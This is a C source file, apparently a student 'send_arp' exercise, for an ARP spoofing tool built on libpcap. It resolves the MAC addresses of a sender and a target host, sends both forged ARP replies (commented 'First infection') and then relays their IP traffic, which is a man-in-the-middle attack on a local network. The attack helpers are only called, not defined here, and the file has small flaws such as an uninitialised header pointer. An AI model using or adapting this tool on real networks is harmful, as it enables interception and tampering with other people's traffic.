#include <sfdafx.h>
#include <send_arp.h>
#include <utill.h>


int main (int argc, const char * argv[])
{
   if (argc != 4) {
     usage();
     return -1;

   }
    const u_char* sender_packet=nullptr;
    const u_char* target_packet=nullptr;
    struct pcap_pkthdr* header;
    const char *dev = argv[1];
    uint32_t SenderIP = inet_addr(argv[2]);
    uint32_t TargetIP = inet_addr(argv[3]);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    ARP *Sen_ARP_Pac = (ARP*)malloc(sizeof(ARP));
    ARP * Tar_ARP_Pac = (ARP*)malloc(sizeof(ARP));
    //IP *IP_Pac;


   if (handle == nullptr) {
     fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
     return -1;
   }

    //Sender Set
    ARP_REQ_ToSender_Set(dev,Sen_ARP_Pac, SenderIP);//Set ARP_Request_Packet
    sender_packet=find_Sender_Mac(handle,header,Sen_ARP_Pac,sender_packet);
    ARP_REP_ToSender_Set(Sen_ARP_Pac,argv,sender_packet); //Set ARP_Reply_Packet

    //Target Set
    ARP_REQ_ToTarget_Set(dev,Tar_ARP_Pac,SenderIP,TargetIP);

    target_packet=find_Target_Mac(handle,header,Tar_ARP_Pac,target_packet);
    ARP_REP_ToTarget_Set(Tar_ARP_Pac,argv,target_packet);

    //First infection

    Send_ARP_ToSender(handle,Sen_ARP_Pac,sizeof(ARP));
    Send_ARP_ToTarget(handle,Tar_ARP_Pac,sizeof(ARP));

//    //Send ARP to Sender & Target

//    //IP_REL_Set(handle,IP_Pac,target_packet,dev,argv);
     printf("target_mac1 : ");
     for(int i=0; i<6; i++) printf("%02x",target_packet[i+6]);
             puts("\n");
    Send_IP_REL(handle,header,Tar_ARP_Pac,Sen_ARP_Pac, target_packet,dev, argv);


    free(Sen_ARP_Pac);
    //free(IP_Pac);

    return 0;
}
